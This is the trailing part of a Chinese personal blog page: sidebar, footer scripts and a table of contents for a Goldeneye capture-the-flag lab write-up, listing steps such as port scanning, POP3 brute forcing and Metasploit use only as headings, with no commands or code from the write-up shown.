class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i> <span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/e5d9e109/" title="002-Lampiao"><img class="cover" src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661497025-eca98eaa2b32fb9dfbaef788041dcde0.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-14</div><div class="title">002-Lampiao</div></div></a></div><div><a href="/posts/a4fe6e02/" title="003-rraven"><img class="cover" src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661497025-eca98eaa2b32fb9dfbaef788041dcde0.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-14</div><div class="title">003-rraven</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/image/avatar.webp" onerror='this.onerror=null,this.src="/image/friend_404.gif"' alt="avatar"><div class="author-info__name">Dansemal</div><div class="author-info__description">f8972f56f293d83c</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/dansemal/" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="iconfont icon-github"></i></a><a class="social-icon" href="mailto:dansemalrayo@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="iconfont icon-mail"></i></a><a class="social-icon" href="https://twitter.com/dansemal" rel="external nofollow noreferrer" target="_blank" title="Twitter"><i class="iconfont icon-twitter"></i></a><a class="social-icon" href="https://space.bilibili.com/89281847" rel="external nofollow noreferrer" target="_blank" title="Bilibili"><i class="iconfont icon-bilibili-fill"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="iconfont icon-socialrssoutline"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">ceshi</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AEGoldeneye"><span class="toc-number">1.</span> <span class="toc-text">项目Goldeneye</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E9%A1%B9%E7%9B%AE%E5%9C%B0%E5%9D%80"><span class="toc-number">2.1.</span> <span class="toc-text">获取项目地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E9%A1%B9%E7%9B%AE%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.2.</span> <span class="toc-text">扫描项目端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.3.</span> <span class="toc-text">访问80端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E9%9A%90%E8%97%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.4.</span> <span class="toc-text">扫描隐藏端口服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hydra-%E7%88%86%E7%A0%B4pop3"><span class="toc-number">2.5.</span> <span class="toc-text">hydra 爆破pop3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nc%E7%99%BB%E5%BD%95pop3%E6%9F%A5%E7%9C%8B%E9%82%AE%E4%BB%B6"><span class="toc-number">2.6.</span> <span class="toc-text">nc登录pop3查看邮件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#boris%E7%9A%84%E9%82%AE%E4%BB%B6"><span class="toc-number">2.6.1.</span> <span class="toc-text">boris的邮件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#natalya%E7%9A%84%E9%82%AE%E4%BB%B6"><span class="toc-number">2.6.2.</span> <span class="toc-text">natalya的邮件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEsevernaya-station-com"><span class="toc-number">2.7.</span> <span class="toc-text">访问severnaya-station.com</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nc%E7%99%BB%E5%BD%95doak"><span class="toc-number">2.7.1.</span> <span class="toc-text">nc登录doak</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BB%E5%BD%95dr-dock%E8%B4%A6%E5%8F%B7"><span class="toc-number">2.7.2.</span> <span class="toc-text">登录dr_dock账号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%9B%BE%E7%89%87%E5%88%86%E6%9E%90"><span class="toc-number">2.7.3.</span> <span class="toc-text">下载图片分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%BE%97%E5%88%B0%E7%9A%84%E5%AF%86%E7%A0%81%E8%BF%9B%E8%A1%8Cadmin%E7%99%BB%E5%BD%95"><span class="toc-number">2.7.4.</span> <span class="toc-text">使用得到的密码进行admin登录</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%B1%87%E6%80%BB"><span class="toc-number">2.8.</span> <span class="toc-text">信息搜集汇总</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8msf%E8%BF%9B%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.0.1.</span> <span class="toc-text">使用msf进行漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2exp"><span class="toc-number">3.0.1.1.</span> <span class="toc-text">搜索exp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8exp"><span class="toc-number">3.0.1.2.</span> <span class="toc-text">使用exp</span></a></li></ol></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/243a10bf/" title="001-Goldeneye"><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661152927-3bb06394a5ddb52b5c35defb01ff116e.webp" onerror='this.onerror=null,this.src="/image/404.webp"' alt="001-Goldeneye"></a><div class="content"><a class="title" href="/posts/243a10bf/" title="001-Goldeneye">001-Goldeneye</a><time datetime="2022-08-14T07:21:00.000Z" title="发表于 2022-08-14 15:21:00">2022-08-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/e5d9e109/" title="002-Lampiao"><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661497025-eca98eaa2b32fb9dfbaef788041dcde0.webp" onerror='this.onerror=null,this.src="/image/404.webp"' alt="002-Lampiao"></a><div class="content"><a class="title" href="/posts/e5d9e109/" title="002-Lampiao">002-Lampiao</a><time datetime="2022-08-14T07:21:00.000Z" title="发表于 2022-08-14 15:21:00">2022-08-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/a4fe6e02/" title="003-rraven"><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661497025-eca98eaa2b32fb9dfbaef788041dcde0.webp" onerror='this.onerror=null,this.src="/image/404.webp"' alt="003-rraven"></a><div class="content"><a class="title" href="/posts/a4fe6e02/" title="003-rraven">003-rraven</a><time datetime="2022-08-14T07:21:00.000Z" title="发表于 2022-08-14 15:21:00">2022-08-14</time></div></div></div></div><div class="card-widget ads-wrap"><ins class="adsbygoogle" style="display:block;text-align:center" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-5809522043388135" data-ad-slot="1885832430"></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="footer_custom_text"><span style="color:#acd7b7">赣ICP备</span> <a href="https://beian.miit.gov.cn/" rel="external nofollow noreferrer" target="_blank" style="color:#ffbbb0">2021005691号-1</a> <img src="/image/ico64.webp" align="absmiddle" width="15px" height="15px"><a href="https://icp.gov.moe" rel="external nofollow noreferrer" target="_blank" style="color:#acd7b7">萌ICP备</a> <a href="https://icp.gov.moe/?keyword=20210727" rel="external nofollow noreferrer" target="_blank" style="color:#ffbbb0">20210727</a> <span style="color:#acd7b7">号</span><br><span style="color:#acd7b7">本网站由</span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral"><img src="/image/logo.webp" align="absmiddle" width="59px" height="30px"></a><span style="color:#acd7b7">提供加速服务</span><br><span style="color:#acd7b7">此网站已勉强运行:</span> &nbsp;<i id="heartbeat" class="fa fas fa-heartbeat"></i>&nbsp;<span id="day_span" style="color:#ffbbb0"></span><span style="color:#acd7b7">天</span><span id="hour_span" style="color:#ffbbb0"></span><span style="color:#acd7b7">小时</span><span id="minute_span" style="color:#ffbbb0"></span><span style="color:#acd7b7">分</span><span id="second_span" style="color:#ffbbb0"></span><span style="color:#acd7b7">秒</span><script>function show_runtime(){window.setTimeout("show_runtime()",1e3),X=new Date("3/22/2021 15:32:05"),Y=new Date,T=Y.getTime()-X.getTime(),M=864e5,a=T/M,A=Math.floor(a),b=24*(a-A),B=Math.floor(b),c=60*(b-B),C=Math.floor(60*(b-B)),D=Math.floor(60*(c-C)),day_span.innerHTML=A,hour_span.innerHTML=B,minute_span.innerHTML=C,second_span.innerHTML=D}show_runtime()</script><script>WIDGET={CONFIG:{modules:"20134",background:"5",tmpColor:"FFFFFF",tmpSize:"16",cityColor:"FFFFFF",citySize:"16",aqiColor:"FFFFFF",aqiSize:"16",weatherIconSize:"24",alertIconSize:"18",padding:"10px 10px 10px 10px",shadow:"0",language:"auto",fixed:"false",vertical:"top",horizontal:"left",key:"199a93a0ff304b398e961cb05353f62f"}}</script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div></div><hr><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/vue.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/medium-zoom.min.js"></script><script src="/js/instantpage.min.js" type="module"></script><script>function panguFn(){"object"==typeof pangu?pangu.autoSpacingPage():getScript("/js/pangu.min.js").then((()=>{pangu.autoSpacingPage()}))}function panguInit(){GLOBAL_CONFIG_SITE.isPost&&panguFn()}document.addEventListener("DOMContentLoaded",panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>document.getElementsByClassName("mermaid").length&&(window.mermaidJsLoad?mermaid.init():getScript("/js/mermaid.min.js").then((()=>{window.mermaidJsLoad=!0,mermaid.initialize({theme:"default"}),mermaid.init()})))</script><script>function loadWaline(){function e(){Waline.init(Object.assign({el:"#waline-wrap",serverURL:"https://waline-dansemal.vercel.app",pageview:!1,dark:'html[data-theme="dark"]',path:window.location.pathname,comment:!0},{placeholder:"支持github登录,或许可能存在xss :cat2_无事可做:",pageSize:8,lang:"zh-CN",emoji:["https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/weibo","https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/bilibili","https://cdn.jsdelivr.net/gh/dansemal/meme@master/everyonecat1","https://cdn.jsdelivr.net/gh/dansemal/meme@master/everyonecat2"],requiredFields:["nick","mail"],search:!0,reaction:!0,admin:"Menhera-Chan"}))}"function"==typeof Waline?e():(function(){const e=document.createElement("link");e.rel="stylesheet",e.href="/css/waline.css",document.head.appendChild(e)}(),getScript("/js/Waline.js").then(e))}{function loadOtherComment(){loadWaline()}setTimeout(loadWaline,0)}</script></div><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.17.0/js/md5.min.js"></script><script>window.addEventListener("load",(()=>{const e=(e,t)=>e||"https://gravatar.loli.net/avatar/"+md5(t.toLowerCase())+"?d=monsterid",t=e=>{let t="";if(e.length)for(let a=0;a<e.length;a++){t+="<div class='aside-list-item'>";{const n="src";t+=`<a href='${e[a].url}' class='thumbnail'><img ${n}='${e[a].avatar}' alt='${e[a].nick}'></a>`}t+=`<div class='content'>\n        <a class='comment' href='${e[a].url}'>${e[a].content}</a>\n        <div class='name'><span>${e[a].nick} / </span><time datetime="${e[a].date}">${btf.diffDate(e[a].date,!0)}</time></div>\n        </div></div>`}else t+="没有评论";let a=document.querySelector("#card-newest-comments .aside-list");a.innerHTML=t,window.lazyLoadInstance&&window.lazyLoadInstance.update(),window.pjax&&window.pjax.refresh(a)},a=()=>{if(document.querySelector("#card-newest-comments .aside-list")){const a=saveToLocal.get("valine-newest-comments");a?t(JSON.parse(a)):fetch("https://api.dansemal.cn/1.1/classes/Comment?limit=6&order=-createdAt",{method:"GET",headers:{"X-LC-Id":"lC0fPoM9k4WqLzhNOTojX9n0-MdYXbMMI","X-LC-Key":"LRFtDNihqvWiC0WuVdQoNfhN","Content-Type":"application/json"}}).then((e=>e.json())).then((a=>{const n=a.results.map((function(t){return{avatar:e(t.QQAvatar,t.mail),content:(a=t.comment,""===a||(a=(a=(a=(a=a.replace(/<img.*?src="(.*?)"?[^\>]+>/gi,"[图片]")).replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi,"[链接]")).replace(/<pre><code>.*?<\/pre>/gi,"[代码]")).replace(/<[^>]+>/g,"")).length>150&&(a=a.substring(0,150)+"..."),a),nick:t.nick,url:t.url+"#"+t.objectId,date:t.updatedAt};var a}));saveToLocal.set("valine-newest-comments",JSON.stringify(n),10/1440),t(n)})).catch((e=>{document.querySelector("#card-newest-comments .aside-list").innerHTML="无法获取评论，请确认相关配置是否正确"}))}};a(),document.addEventListener("pjax:complete",a)}))</script><div class="space"><div class="stars" id="stars"></div><div class="stars2" id="stars2"></div><div class="stars3" id="stars3"></div><div class="solar-syst" id="solar-syst"><div class="sun"></div><div class="mercury"></div><div class="venus"></div><div class="earth"></div><div class="mars"></div><div class="jupiter"></div><div class="saturn"></div><div class="uranus"></div><div class="neptune"></div><div class="pluto"></div><div class="asteroids-belt"></div></div></div><div class="app-refresh" id="app-refresh"><div class="app-refresh-wrap"><label>✨ 网站上架新东西啦 👉</label> <a href="javascript:void(0)" rel="external nofollow noreferrer" onclick="location.reload()">点击刷新</a></div></div><script>function showNotification(){if(GLOBAL_CONFIG.Snackbar){var t="light"===document.documentElement.getAttribute("data-theme")?GLOBAL_CONFIG.Snackbar.bgLight:GLOBAL_CONFIG.Snackbar.bgDark,e=GLOBAL_CONFIG.Snackbar.position;Snackbar.show({text:"已更新最新版本",backgroundColor:t,duration:5e5,pos:e,actionText:"点击刷新",actionTextColor:"#fff",onActionClick:function(t){location.reload()}})}else{var o=`top: 0; background: ${"light"===document.documentElement.getAttribute("data-theme")?"#49b1f5":"#1f1f1f"};`;document.getElementById("app-refresh").style.cssText=o}}"serviceWorker"in navigator&&(navigator.serviceWorker.controller&&navigator.serviceWorker.addEventListener("controllerchange",(function(){showNotification()})),window.addEventListener("load",(function(){navigator.serviceWorker.register("/sw.js")})))</script><script defer src="/js/jquery.min.js"></script><script defer src="/js/issues.min.js"></script><script defer src="/js/hello.js"></script><script data-pjax defer src="/js/chocolate.js"></script><div class="aplayer no-destroy" data-id="4648860439" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listfolded="false" data-order="random" data-preload="none" data-autoplay="false" data-volume="0.1" data-lrctype="1" muted></div><script src="/js/activate-power-mode.min.js"></script><script>POWERMODE.colorful=!0,POWERMODE.shake=!1,POWERMODE.mobile=!0,document.body.addEventListener("input",POWERMODE)</script><link rel="stylesheet" href="/css/APlayer.min.css" media="print" onload='this.media="all"'><script src="/js/APlayer.min.js"></script><script src="/js/Meting.min.js"></script><script src="/js/pjax.min.js"></script><script>let pjaxSelectors=["title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"];var pjax=new Pjax({elements:'a:not([target="_blank"]):not([href="/talking/"]):not([href="/bb/"])',selectors:pjaxSelectors,cacheBust:!1,analytics:!0,scrollRestoration:!1});document.addEventListener("pjax:send",(function(){if(window.removeEventListener("scroll",window.tocScrollFn),"object"==typeof preloader&&preloader.initLoading(),window.aplayers)for(let e=0;e<window.aplayers.length;e++)window.aplayers[e].options.fixed||window.aplayers[e].destroy();"object"==typeof typed&&typed.destroy();const e=document.body.classList;e.contains("read-mode")&&e.remove("read-mode")})),document.addEventListener("pjax:complete",(function(){window.refreshFn(),document.querySelectorAll("script[data-pjax]").forEach((e=>{const t=document.createElement("script"),o=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach((e=>t.setAttribute(e.name,e.value))),t.appendChild(document.createTextNode(o)),e.parentNode.replaceChild(t,e)})),GLOBAL_CONFIG.islazyload&&window.lazyLoadInstance.update(),"function"==typeof chatBtnFn&&chatBtnFn(),"function"==typeof panguInit&&panguInit(),"function"==typeof gtag&&gtag("config","UA-179559972-1",{page_path:window.location.pathname}),"object"==typeof _hmt&&_hmt.push(["_trackPageview",window.location.pathname]),"function"==typeof loadMeting&&document.getElementsByClassName("aplayer").length&&loadMeting(),"object"==typeof Prism&&Prism.highlightAll(),"object"==typeof preloader&&preloader.endLoading()})),document.addEventListener("pjax:error",(e=>{404===e.request.status&&pjax.loadUrl("/404.html")}))</script><script async data-pjax src="/js/busuanzi.pure.mini.js"></script><script>var gitcalendar=new Vue({el:"#gitcalendar",data:{simplemode:!1,user:"dansemal",fixed:"fixed",px:"px",x:"",y:"",span1:"",span2:"",month:["一月","二月","三月","四月","五月","六月","七月","八月","九月","十月","十一月","十二月"],monthchange:[],oneyearbeforeday:"",thisday:"",amonthago:"",aweekago:"",weekdatacore:0,datacore:0,total:0,datadate:"",data:[],positionplusdata:[],firstweek:[],lastweek:[],beforeweek:[],thisweekdatacore:0,mounthbeforeday:0,mounthfirstindex:0,crispedges:"crispedges",thisdayindex:0,amonthagoindex:0,amonthagoweek:[],firstdate:[],first2date:[],montharrbefore:[],monthindex:0,color:["#e4dfd7","#f9f4dc","#f7e8aa","#f7e8aa","#f8df72","#fcd217","#fcc515","#f28e16","#fb8b05","#d85916","#f43e06"]},methods:{selectStyle(e,t){document.querySelector(".angle-wrapper").style.display="block",this.span1=e.date,this.span2=e.count,this.x=t.clientX-100,this.y=t.clientY-60},outStyle(){document.querySelector(".angle-wrapper").style.display="none"},thiscolor(e){if(0===e)return parseInt(e/2),this.color[0];if(e<2)return this.color[1];if(e<20){let t=parseInt(e/2);return this.color[t]}return this.color[9]}}}),apiurl="https://python-github-calendar-api-omega.vercel.app/api?",githubapiurl=apiurl+gitcalendar.user;function responsiveChart(){let e=document.getElementById("gitcanvas");if(e){let t=document.getElementById("gitmessage"),a=e.getContext("2d");e.width=document.getElementById("gitcalendarcanvasbox").offsetWidth;let n=.96*e.width/gitcalendar.data.length;e.height=9*n;let i=.8*n,d={x:.02*e.width,y:.025*e.width};for(let t in gitcalendar.data){weekdata=gitcalendar.data[t];for(let e in weekdata){let t={date:"",count:"",x:0,y:0};gitcalendar.positionplusdata.push(t),a.fillStyle=gitcalendar.thiscolor(weekdata[e].count),d.y=Math.round(100*d.y)/100,t.date=weekdata[e].date,t.count=weekdata[e].count,t.x=d.x,t.y=d.y,a.fillRect(d.x,d.y,i,i),d.y=d.y+n}d.y=.025*e.width,d.x=d.x+n}a.font="600  Arial",a.fillStyle="#aaa",a.fillText("日",0,1.9*n),a.fillText("二",0,3.9*n),a.fillText("四",0,5.9*n),a.fillText("六",0,7.9*n);let r=e.width/24;for(let t in gitcalendar.monthchange)a.fillText(gitcalendar.monthchange[t],r,.7*n),r+=e.width/12;t.onmousemove=function(e){document.querySelector(".angle-wrapper").style.display="none"},e.onmousemove=function(t){document.querySelector(".angle-wrapper").style.display="none",function(e,t){var a=e.getBoundingClientRect(),n=t.clientX-a.left*(e.width/a.width),d=t.clientY-a.top*(e.height/a.height);for(let e of gitcalendar.positionplusdata){let a=n-e.x,r=d-e.y;0<a&&a<i&&0<r&&r<i&&(document.querySelector(".angle-wrapper").style.display="block",gitcalendar.span1=e.date,gitcalendar.span2=e.count,gitcalendar.x=t.clientX-100,gitcalendar.y=t.clientY-60)}}(e,t)}}}function addlastmonth(){0===gitcalendar.thisdayindex?(thisweekcore(52),thisweekcore(51),thisweekcore(50),thisweekcore(49),thisweekcore(48),gitcalendar.thisweekdatacore+=gitcalendar.firstdate[6].count,gitcalendar.amonthago=gitcalendar.firstdate[6].date):(thisweekcore(52),thisweekcore(51),thisweekcore(50),thisweekcore(49),thisweek2core(),gitcalendar.amonthago=gitcalendar.first2date[gitcalendar.thisdayindex-1].date)}function thisweek2core(){for(let e=gitcalendar.thisdayindex-1;e<gitcalendar.first2date.length;e++)gitcalendar.thisweekdatacore+=gitcalendar.first2date[e].count}function thisweekcore(e){for(let t of gitcalendar.data[e])gitcalendar.thisweekdatacore+=t.count}function addlastweek(){for(let e of gitcalendar.lastweek)gitcalendar.weekdatacore+=e.count}function addbeforeweek(){for(let e=gitcalendar.thisdayindex;e<gitcalendar.beforeweek.length;e++)gitcalendar.weekdatacore+=gitcalendar.beforeweek[e].count}function addweek(e){6===gitcalendar.thisdayindex?(gitcalendar.aweekago=gitcalendar.lastweek[0].date,addlastweek()):(lastweek=e.contributions[51],gitcalendar.aweekago=lastweek[gitcalendar.thisdayindex+1].date,addlastweek(),addbeforeweek())}fetch(githubapiurl).then((e=>e.json())).then((e=>{gitcalendar.data=e.contributions,gitcalendar.total=e.total,gitcalendar.first2date=gitcalendar.data[48],gitcalendar.firstdate=gitcalendar.data[47],gitcalendar.firstweek=e.contributions[0],gitcalendar.lastweek=e.contributions[52],gitcalendar.beforeweek=e.contributions[51],gitcalendar.thisdayindex=gitcalendar.lastweek.length-1,gitcalendar.thisday=gitcalendar.lastweek[gitcalendar.thisdayindex].date,gitcalendar.oneyearbeforeday=gitcalendar.firstweek[0].date,gitcalendar.monthindex=1*gitcalendar.thisday.substring(5,7),gitcalendar.montharrbefore=gitcalendar.month.splice(gitcalendar.monthindex,12-gitcalendar.monthindex),gitcalendar.monthchange=gitcalendar.montharrbefore.concat(gitcalendar.month),addweek(e),addlastmonth(),responsiveChart()})).catch((function(e){console.log(e)})),document.getElementById("gitcalendarcanvasbox").offsetWidth<500&&(gitcalendar.simplemode=!1),window.onresize=function(){gitcalendar.simplemode&&responsiveChart()},window.onscroll=function(){document.querySelector(".angle-wrapper")&&(document.querySelector(".angle-wrapper").style.display="none")}</script></div></body></html>